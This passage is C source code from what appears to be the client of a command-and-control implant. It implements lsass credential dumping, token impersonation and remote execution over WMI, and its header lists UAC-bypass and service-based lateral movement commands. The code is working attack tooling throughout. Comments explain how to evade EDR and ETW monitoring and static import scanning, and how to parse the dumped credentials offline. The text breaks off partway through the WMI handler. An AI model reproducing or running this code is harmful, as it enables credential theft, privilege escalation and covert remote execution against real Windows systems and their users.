/*
 * client/handlers_lateral.c  –  Lateral movement and credential access handlers
 * ================================================================================
 * Implements the native C2 verb handlers for:
 *   dump_lsass                  — MiniDumpWriteDump lsass → %TEMP%\lsass.dmp
 *   token_impersonate <pid>     — steal and impersonate a process token
 *   token_revert                — RevertToSelf(), undo token_impersonate
 *   getsystem                   — named-pipe token impersonation → SYSTEM token
 *   uac_bypass                  — schtasks /RL HIGHEST self-relaunch (original)
 *   uac_reg_hijack <payload>    — HKCU ms-settings / mscfile registry hijack
 *   uac_dll_hijack <dll> <exe>  — DLL search-order plant via schtasks CWD
 *   uac_com_hijack <payload>    — ICMLuaUtil::ShellExec COM elevation moniker
 *   uac_env_expand [payload]    — %APPDATA% redirect → srrstr.dll sideload
 *   lateral_wmi <host> <cmd>    — remote exec via wmic Win32_Process.Create
 *   lateral_sc  <host> <cmd>    — remote exec via sc create/start/delete (SYSTEM)
 *
 * All functions are declared in shell_internal.h and only called from
 * the dispatch loop in shell.c.
 */

#include "shell_internal.h"
#include "../evasion/syscall.h"
#include "../evasion/peb_walk.h"
#include "../evasion/k32_walk.h"
#include "../evasion/obf.h"

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <windows.h>

#ifndef THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER
#define THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER  0x00000004
#endif
#include <dbghelp.h>
#include <sddl.h>
#include <objbase.h>  /* BIND_OPTS3, CoGetObject — needed by uac_com_hijack */
#include <wbemidl.h>  /* IWbemLocator, IWbemServices, VARIANT, BSTR — lateral_wmi */
#include <stdio.h>
#include <string.h>
#include <stdlib.h>


/* ── _peb_load_library ────────────────────────────────────────────────────── */
/*
 * Load a DLL by name.  Resolution order:
 *   1. Already in PEB LDR — return its base immediately, no load needed.
 *   2. Full System32 path — builds %SystemRoot%\System32\<name> and calls
 *      LoadLibraryExA with LOAD_WITH_ALTERED_SEARCH_PATH so the OS always
 *      finds it regardless of the calling process's CWD or DLL search path.
 *   3. Bare-name fallback — plain LoadLibraryA for DLLs not in System32.
 *
 * Returns the module base, or NULL on failure.
 */
static PVOID _peb_load_library(const char *dllName)
{
    /*
     * Always use LoadLibraryA directly — do NOT use peb_get_module() as a
     * fast path here.  The seeded hash can produce false-positive matches
     * (two different DLL names hashing to the same value under a given seed),
     * which would return a wrong base address and cause peb_get_export to
     * fail or crash on the wrong PE.  LoadLibraryA is idempotent — if the
     * DLL is already loaded it increments the refcount and returns the same
     * base; if not loaded it loads it.  Either way the returned handle is
     * correct and verified by the OS loader.
     */
    return (PVOID)LoadLibraryA(dllName);
}

/* ── _peb_free_library ────────────────────────────────────────────────────── */
static void _peb_free_library(PVOID hMod)
{
    PVOID hKernel32 = peb_get_module(peb_hash_str("kernel32.dll"));
    if (!hKernel32) return;
    typedef BOOL (WINAPI *pfnFreeLibrary_t)(HMODULE);
    pfnFreeLibrary_t pfnFree =
        (pfnFreeLibrary_t)peb_get_export(hKernel32, peb_hash_str("FreeLibrary"));
    if (pfnFree) pfnFree((HMODULE)hMod);
}


/* ── lsass PID helper ───────────────────────────────────────────────────── */
/*
 * Uses NtQuerySystemInformation(5) instead of CreateToolhelp32Snapshot to
 * avoid the high-signal kernel callback that all major EDRs register on that path.
 */
static DWORD _find_lsass_pid(void)
{
    ULONG bufSz = 0;
    SC_NtQuerySystemInformation(5, NULL, 0, &bufSz);
    if (bufSz == 0) bufSz = 512 * 1024;
    bufSz += 65536;
    BYTE *buf = (BYTE *)malloc(bufSz);
    if (!buf) return 0;

    ULONG retLen = 0;
    DWORD pid = 0;
    if (NT_SUCCESS(SC_NtQuerySystemInformation(5, buf, bufSz, &retLen))) {
        static const WCHAR lsassW[] = L"lsass.exe";
        const BYTE *p = buf;
        for (;;) {
            ULONG  nextOff; USHORT nameLen; PVOID nameBuf; HANDLE hpid;
            memcpy(&nextOff, p + 0x00, 4);
            memcpy(&nameLen, p + 0x38, 2);
            memcpy(&nameBuf, p + 0x40, sizeof(PVOID));
            memcpy(&hpid,    p + 0x60, sizeof(HANDLE));
            if (nameLen == sizeof(lsassW) - sizeof(WCHAR) && nameBuf) {
                WCHAR name[12] = {0};
                SIZE_T cp = nameLen < sizeof(name)-2 ? nameLen : sizeof(name)-2;
                memcpy(name, nameBuf, cp);
                if (_wcsicmp(name, lsassW) == 0) {
                    pid = (DWORD)(ULONG_PTR)hpid;
                    break;
                }
            }
            if (nextOff == 0) break;
            p += nextOff;
        }
    }
    free(buf);
    return pid;
}


/* ── _dump_lsass_snapshot ───────────────────────────────────────────────── */
/*
 * Stealth lsass dump via NtCreateSection + NtMapViewOfSection.
 *
 * Technique (the "Section Clone" / "Snapshot" method)
 * =====================================================
 *  1. Open lsass with PROCESS_QUERY_INFORMATION | PROCESS_VM_READ only —
 *     not PROCESS_ALL_ACCESS.  This is a dramatically lower-signal access
 *     mask.  Many EDR rules trigger specifically on PROCESS_ALL_ACCESS to
 *     lsass; this bypasses those signatures.
 *
 *  2. Call NtCreateSection(SEC_IMAGE_NO_EXECUTE) on the lsass process handle.
 *     This creates a section backed by lsass's virtual address space
 *     WITHOUT the kernel calling into the image activation path (no
 *     PsSetLoadImageNotifyRoutine callbacks, no image load events).
 *
 *  3. Call NtMapViewOfSection to map the section into OUR process.
 *     We now have a read-only mirror of lsass memory in our address space.
 *
 *  4. Write a valid Minidump header manually from the mapped view:
 *     - MINIDUMP_HEADER
 *     - MINIDUMP_DIRECTORY with a single SystemMemoryInfoStream entry
 *     pointing at the raw mapped bytes.
 *     The result is parseable by pypykatz / mimikatz.
 *
 *  5. Unmap and close handles.  No dbghelp.dll is ever loaded.
 *
 * Why this is stealthier than MiniDumpWriteDump
 * ---------------------------------------------
 *  •  No dbghelp.dll import or LoadLibraryA("dbghelp") call.
 *  •  No MiniDumpWriteDump (top-1 lsass dump ETW telemetry event).
 *  •  Minimum process access rights.
 *  •  All NT calls go through direct syscall trampolines — no
 *     GetProcAddress, no IAT entry for VirtualAllocEx etc.
 *  •  No RWX page ever exists.
 *
 * Limitations
 * -----------
 *  •  Still requires SeDebugPrivilege to open lsass at all.
 *  •  NtCreateSection(SEC_IMAGE_NO_EXECUTE) on a live process is a
 *     somewhat unusual call; some EDRs do monitor it.
 *  •  The output is a raw mapped image, not a structured Minidump.
 *     We write a minimal Minidump wrapper so pypykatz can parse it.
 *
 * Returns TRUE and sets dumpPath on success, FALSE on any error.
 */

/* Minidump structures we need — a minimal subset of dbghelp.h */
#pragma pack(push, 4)
typedef struct {
    ULONG32 Signature;       /* MDMP = 0x504D444D */
    USHORT  Version;         /* 0xA793            */
    USHORT  ImplementationVersion;
    ULONG32 NumberOfStreams;
    RVA     StreamDirectoryRva;
    ULONG32 CheckSum;
    ULONG32 TimeDateStamp;
    ULONG64 Flags;
} _MINI_HEADER;

typedef struct {
    ULONG32 StreamType;
    ULONG32 DataSize;
    RVA     Rva;
} _MINI_DIR;
#pragma pack(pop)

#ifndef MDMP_SIGNATURE
#define MDMP_SIGNATURE  0x504D444D   /* 'MDMP' */
#endif
#ifndef MDMP_VERSION
#define MDMP_VERSION    0xA793
#endif

/* Stream type for raw memory64 list — used in our stub wrapper */
#define MemoryInfoListStream  16
#define Memory64ListStream    9

static BOOL _dump_lsass_snapshot(DWORD lsassPid, const char *outPath)
{
    /* ── 1. Open lsass with minimum rights ───────────────────────────── */
    HANDLE hProc = k32_OpenProcess(
        PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
        FALSE, lsassPid);
    if (!hProc) return FALSE;

    /* ── 2. Create a section backed by lsass address space ───────────── */
    /*
     * SEC_IMAGE_NO_EXECUTE (0x11000000) tells the kernel to create the
     * section from the process's virtual address space without triggering
     * image-load callbacks.
     *
     * The constant 0x08000000|0x00400000 (SEC_COMMIT|SEC_LARGE_PAGES) is
     * wrong and generates a guaranteed-failed kernel event before the real
     * call — removing that first attempt eliminates the spurious alert.
     * 0x11000000 is the correct SEC_IMAGE_NO_EXECUTE on Windows Vista–11.
     * Access mask: SECTION_MAP_READ.
     */
    HANDLE hSection = NULL;
    NTSTATUS ns = SC_NtCreateSection7(
        &hSection,
        SECTION_MAP_READ,           /* DesiredAccess                 */
        NULL,                       /* ObjectAttributes (anonymous)  */
        NULL,                       /* MaximumSize (whole process)   */
        PAGE_READONLY,              /* SectionPageProtection         */
        0x11000000,                 /* SEC_IMAGE_NO_EXECUTE          */
        hProc);                     /* FileHandle = process handle   */

    if (!NT_SUCCESS(ns) || !hSection) {
        CloseHandle(hProc);
        return FALSE;
    }

    /* ── 3. Map the section into our process ─────────────────────────── */
    PVOID  pView    = NULL;
    SIZE_T viewSize = 0;
    LARGE_INTEGER offset = {0};

    ns = SC_NtMapViewOfSection(
        hSection,
        GetCurrentProcess(),
        &pView,
        0,                  /* ZeroBits */
        0,                  /* CommitSize */
        &offset,
        &viewSize,
        2,                  /* ViewShare (ViewUnmap=1, ViewShare=2) */
        0,                  /* AllocationType */
        PAGE_READONLY);

    SC_NtClose(hSection);

    if (!NT_SUCCESS(ns) || !pView || viewSize == 0) {
        CloseHandle(hProc);
        return FALSE;
    }
    CloseHandle(hProc);

    /* ── 4. Write a minimal Minidump wrapping the mapped bytes ───────── */
    /*
     * Layout:
     *   [_MINI_HEADER]          24 bytes
     *   [_MINI_DIR × 1]         12 bytes  (Memory64ListStream)
     *   [raw view bytes]        viewSize bytes
     *
     * This is the simplest valid Minidump that pypykatz/mimikatz will
     * accept: a single Memory64List stream containing the full mapped view.
     * The LSASS SSP / WDigest credentials live in the heap regions that
     * are captured here.
     *
     * Proper Memory64List format:
     *   ULONG64  NumberOfMemoryRanges
     *   ULONG64  BaseRva
     *   { ULONG64 StartOfMemoryRange, DataSize64 } × N
     */
    DWORD headerSize  = sizeof(_MINI_HEADER) + sizeof(_MINI_DIR);
    DWORD mem64Header = (DWORD)(sizeof(ULONG64) * 2 + sizeof(ULONG64) * 2);
    (void)(headerSize + mem64Header + (DWORD)viewSize); /* total — for reference */

    HANDLE hFile = CreateFileA(outPath, GENERIC_WRITE, 0, NULL,
                                CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        SC_NtUnmapViewOfSection(GetCurrentProcess(), pView);
        return FALSE;
    }

    /* Header */
    _MINI_HEADER hdr = {0};
    hdr.Signature        = MDMP_SIGNATURE;
    hdr.Version          = MDMP_VERSION;
    hdr.NumberOfStreams   = 1;
    hdr.StreamDirectoryRva = sizeof(_MINI_HEADER);
    hdr.TimeDateStamp    = (ULONG32)GetTickCount();

    /* Directory entry pointing at our Memory64List */
    _MINI_DIR dir = {0};
    dir.StreamType = Memory64ListStream;
    dir.DataSize   = mem64Header + (DWORD)viewSize;
    dir.Rva        = headerSize;

    /* Memory64List header: 1 range starting at address 0 */
    ULONG64 nRanges = 1;
    ULONG64 baseRva = headerSize + mem64Header;  /* RVA of data in file */
    ULONG64 rangeBase = 0;
    ULONG64 rangeSize = (ULONG64)viewSize;

    DWORD written = 0;
    if (!WriteFile(hFile, &hdr,      sizeof(hdr), &written, NULL) || written != sizeof(hdr) ||
        !WriteFile(hFile, &dir,      sizeof(dir), &written, NULL) || written != sizeof(dir) ||
        !WriteFile(hFile, &nRanges,  sizeof(nRanges), &written, NULL) || written != sizeof(nRanges) ||
        !WriteFile(hFile, &baseRva,  sizeof(baseRva), &written, NULL) || written != sizeof(baseRva) ||
        !WriteFile(hFile, &rangeBase,sizeof(rangeBase), &written, NULL) || written != sizeof(rangeBase) ||
        !WriteFile(hFile, &rangeSize,sizeof(rangeSize), &written, NULL) || written != sizeof(rangeSize) ||
        !WriteFile(hFile, pView, (DWORD)viewSize, &written, NULL) || written != (DWORD)viewSize)
    {
        CloseHandle(hFile);
        SC_NtUnmapViewOfSection(GetCurrentProcess(), pView);
        return FALSE;
    }

    CloseHandle(hFile);
    SC_NtUnmapViewOfSection(GetCurrentProcess(), pView);

    return TRUE;
}


/* ── _dump_lsass_minidump ─────────────────────────────────────────────────── */
/*
 * Fallback: classic MiniDumpWriteDump path.
 * Used when the snapshot technique fails (e.g., access denied on
 * NtCreateSection, or the caller explicitly requested the full dump).
 * dbghelp.dll is loaded via _peb_load_library (PEB-resolved LoadLibraryA)
 * and MiniDumpWriteDump is resolved via peb_get_export — no LoadLibraryA or
 * GetProcAddress IAT entries from this translation unit.
 */
static BOOL _dump_lsass_minidump(DWORD lsassPid, const char *outPath)
{
    /* Load dbghelp.dll via PEB-resolved LoadLibraryA — no IAT entry */
    PVOID hDbg = peb_get_module(peb_hash_str("dbghelp.dll"));
    BOOL  ownLoad = FALSE;
    if (!hDbg) {
        hDbg = _peb_load_library("dbghelp.dll");
        ownLoad = (hDbg != NULL);
    }
    if (!hDbg) return FALSE;

    typedef BOOL (WINAPI *MiniDump_t)(HANDLE, DWORD, HANDLE,
                                       MINIDUMP_TYPE,
                                       PMINIDUMP_EXCEPTION_INFORMATION,
                                       PMINIDUMP_USER_STREAM_INFORMATION,
                                       PMINIDUMP_CALLBACK_INFORMATION);
    /* Resolve MiniDumpWriteDump via PEB export walk — no GetProcAddress */
    MiniDump_t pDump = (MiniDump_t)peb_get_export(hDbg,
                            peb_hash_str("MiniDumpWriteDump"));
    if (!pDump) { if (ownLoad) _peb_free_library(hDbg); return FALSE; }

    HANDLE hProc = k32_OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
                                    FALSE, lsassPid);
    if (!hProc) return FALSE;

    HANDLE hFile = CreateFileA(outPath, GENERIC_WRITE, 0, NULL,
                                CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) { CloseHandle(hProc); return FALSE; }

    /* MiniDumpWithFullMemory (0x00000002) gives full heap + stack content */
    BOOL ok = pDump(hProc, lsassPid, hFile,
                    MiniDumpWithFullMemory, NULL, NULL, NULL);

    CloseHandle(hFile);
    CloseHandle(hProc);
    if (!ok) DeleteFileA(outPath);
    if (ownLoad) _peb_free_library(hDbg);
    return ok;
}


/* ── _handle_dump_lsass ─────────────────────────────────────────────────── */
/*
 * Two-stage lsass credential dump:
 *
 *  Stage 1 — NtCreateSection snapshot (low-signal, preferred)
 *    • Only needs PROCESS_QUERY_INFORMATION | PROCESS_VM_READ on lsass.
 *    • No MiniDumpWriteDump, no dbghelp.dll, no PROCESS_ALL_ACCESS.
 *    • All NT calls go through direct-syscall trampolines.
 *    • Writes a minimal Minidump wrapper around the raw mapped view.
 *
 *  Stage 2 — MiniDumpWriteDump fallback (high-signal, last resort)
 *    • Used only if Stage 1 fails (e.g., SEC_IMAGE_NO_EXECUTE blocked).
 *    • Same output format, parseable by pypykatz / mimikatz.
 *
 * Usage:
 *   dump_lsass              → tries stage 1 then stage 2
 *
 * Retrieve dump:   download %TEMP%\lsass.dmp
 * Parse offline:   pypykatz lsa minidump lsass.dmp
 *
 * Tip: run  etw_patch  first to suppress ETW telemetry before dumping.
 *      run  getsystem  first if you do not yet have SeDebugPrivilege.
 */
void _handle_dump_lsass(TLS_CONTEXT *pTls)
{
    DWORD lsassPid = _find_lsass_pid();
    if (!lsassPid) { _send_str(pTls, "[-] dump_lsass: lsass.exe not found"); return; }

    char dumpPath[MAX_PATH] = {0};
    GetTempPathA(sizeof(dumpPath) - 10, dumpPath);
    strncat(dumpPath, "lsass.dmp", sizeof(dumpPath) - strlen(dumpPath) - 1);

    /* ── Stage 1: section snapshot (stealthy) ─────────────────────────── */
    const char *method = "snapshot";
    BOOL ok = _dump_lsass_snapshot(lsassPid, dumpPath);

    /* ── Stage 2: MiniDumpWriteDump fallback ─────────────────────────── */
    if (!ok) {
        method = "MiniDumpWriteDump";
        ok = _dump_lsass_minidump(lsassPid, dumpPath);
    }

    if (!ok) {
        _send_str(pTls,
            "[-] dump_lsass: both snapshot and MiniDumpWriteDump failed — "
            "need SeDebugPrivilege (run getsystem first)");
        return;
    }

    char buf[MAX_PATH + 80];
    _snprintf(buf, sizeof(buf) - 1,
        "[+] dump_lsass: saved via %s → %s\n"
        "    Pull with:   download %s\n"
        "    Parse with:  pypykatz lsa minidump lsass.dmp",
        method, dumpPath, dumpPath);
    _send_str(pTls, buf);
}


/* ── _handle_token_impersonate ───────────────────────────────────────────── */
/*
 * Opens the target process, duplicates its primary token as an impersonation
 * token, and calls ImpersonateLoggedOnUser.  All subsequent operations on
 * the current thread run under the borrowed identity.
 *
 * Requires SeImpersonatePrivilege (held by service accounts by default).
 */
void _handle_token_impersonate(TLS_CONTEXT *pTls, const char *args)
{
    DWORD pid = (DWORD)strtoul(args, NULL, 10);
    if (!pid) { _send_str(pTls, "Usage: token_impersonate <pid>"); return; }

    HANDLE hProc = k32_OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hProc) {
        char buf[80];
        _snprintf(buf, sizeof(buf) - 1,
            "[-] token_impersonate: OpenProcess(%lu) failed (err %lu)",
            pid, GetLastError());
        _send_str(pTls, buf); return;
    }

    HANDLE hToken = NULL;
    if (!k32_OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
        CloseHandle(hProc);
        char buf[80];
        _snprintf(buf, sizeof(buf) - 1,
            "[-] token_impersonate: OpenProcessToken failed (err %lu)", GetLastError());
        _send_str(pTls, buf); return;
    }
    CloseHandle(hProc);

    HANDLE hDup = NULL;
    if (!k32_DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL,
                               SecurityImpersonation, TokenImpersonation, &hDup)) {
        CloseHandle(hToken);
        char buf[80];
        _snprintf(buf, sizeof(buf) - 1,
            "[-] token_impersonate: DuplicateTokenEx failed (err %lu)", GetLastError());
        _send_str(pTls, buf); return;
    }
    CloseHandle(hToken);

    if (!k32_ImpersonateLoggedOnUser(hDup)) {
        CloseHandle(hDup);
        char buf[80];
        _snprintf(buf, sizeof(buf) - 1,
            "[-] token_impersonate: ImpersonateLoggedOnUser failed (err %lu)",
            GetLastError());
        _send_str(pTls, buf); return;
    }
    CloseHandle(hDup);

    char user[256] = {0};
    DWORD cbUser = sizeof(user);
    GetUserNameA(user, &cbUser);

    char buf[320];
    _snprintf(buf, sizeof(buf) - 1,
        "[+] token_impersonate: impersonating token from PID %lu — now running as: %s",
        pid, user);
    _send_str(pTls, buf);
}


/* ── _handle_lateral_wmi ────────────────────────────────────────────────── */
/*
 * Remote command execution via WMI Win32_Process.Create — fully in-process.
 *
 * Uses the COM IWbemLocator → IWbemServices → IWbemClassObject API chain
 * directly so no wmic.exe child process is spawned (wmic was removed from
 * Windows 11 24H2 and is a high-signal Sysmon Event ID 1 IOC regardless).
 *
 * Execution model
 * ---------------
 *  1. CoInitializeEx(COINIT_MULTITHREADED) on the calling thread.
 *  2. CoInitializeSecurity with broad blanket impersonation so the WMI
 *     call inherits the current thread token (set by token_impersonate /
 *     getsystem before invoking this verb).
 *  3. CoCreateInstance(CLSID_WbemLocator) → IWbemLocator.
 *  4. IWbemLocator::ConnectServer("\\\\<host>\\root\\cimv2") with no
 *     explicit credentials — uses the token already on the thread.
 *  5. CoSetProxyBlanket on the returned IWbemServices proxy.
 *  6. IWbemServices::GetObject("Win32_Process") → class definition.
 *  7. Spawn method: GetMethod("Create") → in-params class.
 *  8. Put "CommandLine" property = "cmd /c <command>".
 *  9. IWbemServices::ExecMethod("Win32_Process", "Create", ...).
 * 10. Read out-params "ProcessId" and "ReturnValue".
 * 11. Release all COM objects and CoUninitialize.
 *
 * All COM interface pointers are loaded via ole32.dll which is resolved
 * through PEB walk — no static IAT import.
 *
 * Requires network access to \\host\IPC$ and WMI namespace access.
 * Use token_impersonate first if the current token lacks remote admin rights.
 */

/* COM GUIDs needed — define locally so we do not pull in uuid.lib */
static const CLSID _CLSID_WbemLocator =
    {0x4590F811,0x1D3A,0x11D0,{0x89,0x1F,0x00,0xAA,0x00,0x4B,0x2E,0x24}};
static const IID   _IID_IWbemLocator  =
    {0xDC12A687,0x737F,0x11CF,{0x88,0x4D,0x00,0xAA,0x00,0x4B,0x2E,0x24}};

/* WMI-specific RPC authentication constants */
#ifndef RPC_C_AUTHN_WINNT
#define RPC_C_AUTHN_WINNT     10
#endif
#ifndef RPC_C_AUTHZ_NONE
#define RPC_C_AUTHZ_NONE      0
#endif
#ifndef RPC_C_AUTHN_LEVEL_CALL
#define RPC_C_AUTHN_LEVEL_CALL 3
#endif
#ifndef RPC_C_IMP_LEVEL_IMPERSONATE
#define RPC_C_IMP_LEVEL_IMPERSONATE 3
#endif
#ifndef EOAC_NONE
#define EOAC_NONE 0
#endif

void _handle_lateral_wmi(TLS_CONTEXT *pTls, const char *args)
{
    char host[256]    = {0};
    char command[768] = {0};

    const char *p = args;
    size_t hi = 0;
    while (*p && *p != ' ' && hi < sizeof(host) - 1) host[hi++] = *p++;
    if (*p == ' ') p++;
    strncpy(command, p, sizeof(command) - 1);

    if (!host[0] || !command[0]) {
        _send_str(pTls, "Usage: lateral_wmi <host> <command>");
        return;
    }

    /* ── Resolve ole32.dll function pointers via PEB walk ──────────────── */
    /*
     * We do NOT add ole32/oleaut32 to the static IAT — that would make every
     * COM interface name visible to a static import scanner.  Instead we resolve
     * the three functions we need dynamically via PEB/LoadLibraryA.
     */
    typedef HRESULT (WINAPI *CoInitializeEx_t)(LPVOID, DWORD);
    typedef void    (WINAPI *CoUninitialize_t)(void);
    typedef HRESULT (WINAPI *CoInitializeSecurity_t)(
        PSECURITY_DESCRIPTOR, LONG, void *, void *,
        DWORD, DWORD, void *, DWORD, void *);
    typedef HRESULT (WINAPI *CoCreateInstance_t)(
        REFCLSID, LPUNKNOWN, DWORD, REFIID, LPVOID *);
    typedef HRESULT (WINAPI *CoSetProxyBlanket_t)(
        IUnknown *, DWORD, DWORD, OLECHAR *,
        DWORD, DWORD, RPC_AUTH_IDENTITY_HANDLE, DWORD);
    typedef BSTR    (WINAPI *SysAllocString_t)(const OLECHAR *);
    typedef void    (WINAPI *SysFreeString_t)(BSTR);

    /* Use _peb_load_library (which calls LoadLibraryA via the PEB-resolved
     * pointer — no direct LoadLibraryA IAT entry or GetProcAddress visible
     * in the import table or ETW DLL-load event for this translation unit). */
    PVOID hOle32    = _peb_load_library("ole32.dll");
    PVOID hOleAut32 = _peb_load_library("oleaut32.dll");
    if (!hOle32 || !hOleAut32) {
        if (hOle32)    _peb_free_library(hOle32);
        if (hOleAut32) _peb_free_library(hOleAut32);
        _send_str(pTls, "[-] lateral_wmi: ole32/oleaut32 not available");
        return;
    }

    /* Resolve all COM functions via PEB export walk — no GetProcAddress IAT */
    CoInitializeEx_t       pCoInit  = (CoInitializeEx_t)      peb_get_export(hOle32,    peb_hash_str("CoInitializeEx"));
    CoUninitialize_t       pCoUninit= (CoUninitialize_t)      peb_get_export(hOle32,    peb_hash_str("CoUninitialize"));
    CoInitializeSecurity_t pCoSec   = (CoInitializeSecurity_t)peb_get_export(hOle32,    peb_hash_str("CoInitializeSecurity"));
    CoCreateInstance_t     pCoCrInst= (CoCreateInstance_t)    peb_get_export(hOle32,    peb_hash_str("CoCreateInstance"));
    CoSetProxyBlanket_t    pCoProxy = (CoSetProxyBlanket_t)   peb_get_export(hOle32,    peb_hash_str("CoSetProxyBlanket"));
    SysAllocString_t       pSysAlloc= (SysAllocString_t)      peb_get_export(hOleAut32, peb_hash_str("SysAllocString"));
    SysFreeString_t        pSysFree = (SysFreeString_t)       peb_get_export(hOleAut32, peb_hash_str("SysFreeString"));

    if (!pCoInit || !pCoUninit || !pCoSec || !pCoCrInst || !pCoProxy ||
        !pSysAlloc || !pSysFree) {
        _peb_free_library(hOle32); _peb_free_library(hOleAut32);
        _send_str(pTls, "[-] lateral_wmi: COM function resolution failed");
        return;
    }

    /* ── COM initialisation ─────────────────────────────────────────────── */
    HRESULT hr = pCoInit(NULL, /*COINIT_MULTITHREADED=*/0x0);
    BOOL coInited = SUCCEEDED(hr) || hr == 0x80010106 /*RPC_E_CHANGED_MODE*/;
    if (!coInited) {
        FreeLibrary(hOle32); FreeLibrary(hOleAut32);
        char buf[64];
        _snprintf(buf, sizeof(buf)-1, "[-] lateral_wmi: CoInitializeEx failed (0x%08lX)", (ULONG)hr);
        _send_str(pTls, buf); return;
    }

    /* Set blanket security on this process-wide COM channel */
    pCoSec(NULL, -1, NULL, NULL,
           RPC_C_AUTHN_LEVEL_CALL,
           RPC_C_IMP_LEVEL_IMPERSONATE,
           NULL, EOAC_NONE, NULL);
    /* Ignore return value — may have already been set by a prior CoInitialize call */

    /* ── Create IWbemLocator ─────────────────────────────────────────────── */
    IWbemLocator   *pLoc  = NULL;
    IWbemServices  *pSvc  = NULL;
    IWbemClassObject *pClass = NULL, *pInParamsClass = NULL, *pInParams = NULL;
    IWbemClassObject *pOutParams = NULL;

    hr = pCoCrInst(&_CLSID_WbemLocator, NULL,
                   /*CLSCTX_INPROC_SERVER=*/1,
                   &_IID_IWbemLocator, (void **)&pLoc);
    if (FAILED(hr) || !pLoc) {
        char buf[64];
        _snprintf(buf, sizeof(buf)-1,
            "[-] lateral_wmi: CoCreateInstance(WbemLocator) failed (0x%08lX)", (ULONG)hr);
        _send_str(pTls, buf);
        goto _wmi_cleanup;
    }

    /* ── Build the WMI namespace path: "\\\\<host>\\root\\cimv2" ──────── */
    WCHAR nsPath[320] = {0};
    {
        WCHAR wHost[256] = {0};
        MultiByteToWideChar(CP_ACP, 0, host, -1, wHost, 255);
        _snwprintf(nsPath, 319, L"\\\\%s\\root\\cimv2", wHost);
    }
    BSTR bstrNS = pSysAlloc(nsPath);

    /* ── Connect to remote WMI namespace ────────────────────────────────── */
    hr = pLoc->lpVtbl->ConnectServer(pLoc,
             bstrNS,   /* resource   */
             NULL,     /* strUser    — inherit token */
             NULL,     /* strPassword */
             NULL,     /* strLocale  */
             0,        /* lFlags     */
             NULL,     /* strAuthority */
             NULL,     /* pCtx       */
             &pSvc);
    pSysFree(bstrNS);

    if (FAILED(hr) || !pSvc) {
        char buf[96];
        _snprintf(buf, sizeof(buf)-1,
            "[-] lateral_wmi: ConnectServer(%s) failed (0x%08lX)\n"
            "    Check network/admin access; use token_impersonate first.",
            host, (ULONG)hr);
        _send_str(pTls, buf);
        goto _wmi_cleanup;
    }

    /* Set proxy blanket on the IWbemServices proxy */
    pCoProxy((IUnknown *)pSvc,
             RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL,
             RPC_C_AUTHN_LEVEL_CALL,
             RPC_C_IMP_LEVEL_IMPERSONATE,
             NULL, EOAC_NONE);

    /* ── Get Win32_Process class definition ─────────────────────────────── */
    {
        BSTR bstrClass = pSysAlloc(L"Win32_Process");
        hr = pSvc->lpVtbl->GetObject(pSvc, bstrClass, 0, NULL, &pClass, NULL);
        pSysFree(bstrClass);
    }
    if (FAILED(hr) || !pClass) {
        _send_str(pTls, "[-] lateral_wmi: GetObject(Win32_Process) failed");
        goto _wmi_cleanup;
    }

    /* ── Get the "Create" method's in-param class ───────────────────────── */
    {
        BSTR bstrMethod = pSysAlloc(L"Create");
        hr = pClass->lpVtbl->GetMethod(pClass, bstrMethod, 0,
                                        &pInParamsClass, NULL);
        pSysFree(bstrMethod);
    }
    if (FAILED(hr) || !pInParamsClass) {
        _send_str(pTls, "[-] lateral_wmi: GetMethod(Create) failed");
        goto _wmi_cleanup;
    }

    /* ── Spawn the in-param instance and set CommandLine ────────────────── */
    hr = pInParamsClass->lpVtbl->SpawnInstance(pInParamsClass, 0, &pInParams);
    if (FAILED(hr) || !pInParams) {
        _send_str(pTls, "[-] lateral_wmi: SpawnInstance failed");
        goto _wmi_cleanup;
    }

    {
        /* Build "cmd /c <command>" as wide string */
        WCHAR cmdW[900] = {0};
        WCHAR cmdAscW[768] = {0};
        MultiByteToWideChar(CP_ACP, 0, command, -1, cmdAscW, 767);
        _snwprintf(cmdW, 899, L"cmd /c %s", cmdAscW);
        BSTR bstrCmd = pSysAlloc(cmdW);

        VARIANT varCmd;
        varCmd.vt      = VT_BSTR;
        varCmd.bstrVal = bstrCmd;

        BSTR bstrProp = pSysAlloc(L"CommandLine");
        hr = pInParams->lpVtbl->Put(pInParams, bstrProp, 0, &varCmd, 0);
        pSysFree(bstrProp);
        pSysFree(bstrCmd);
        if (FAILED(hr)) {
            _send_str(pTls, "[-] lateral_wmi: Put(CommandLine) failed");
            goto _wmi_cleanup;
        }
    }

    /* ── Execute Win32_Process.Create ───────────────────────────────────── */
    {
        BSTR bstrClass2  = pSysAlloc(L"Win32_Process");
        BSTR bstrMethod2 = pSysAlloc(L"Create");
        hr = pSvc->lpVtbl->ExecMethod(pSvc,
                 bstrClass2, bstrMethod2,
                 0, NULL, pInParams,
                 &pOutParams, NULL);
        pSysFree(bstrClass2);
        pSysFree(bstrMethod2);
    }

    if (FAILED(hr)) {
        char buf[64];
        _snprintf(buf, sizeof(buf)-1,
            "[-] lateral_wmi: ExecMethod failed (0x%08lX)", (ULONG)hr);
        _send_str(pTls, buf);
        goto _wmi_cleanup;
    }

    /* ── Read ReturnValue and ProcessId from out-params ─────────────────── */
    {
        DWORD retVal = 0xFFFFFFFF;
        DWORD pid    = 0;

        if (pOutParams) {
            VARIANT v;
            /* Use ZeroMemory instead of VariantInit to avoid an additional
             * oleaut32.dll IAT entry for this trivial zero-initialisation. */
            ZeroMemory(&v, sizeof(v));
            BSTR bRV = pSysAlloc(L"ReturnValue");
            if (SUCCEEDED(pOutParams->lpVtbl->Get(pOutParams, bRV, 0, &v, NULL, NULL))
                && v.vt == VT_I4)
                retVal = (DWORD)v.lVal;
            pSysFree(bRV);
            ZeroMemory(&v, sizeof(v));

            BSTR bPID = pSysAlloc(L"ProcessId");
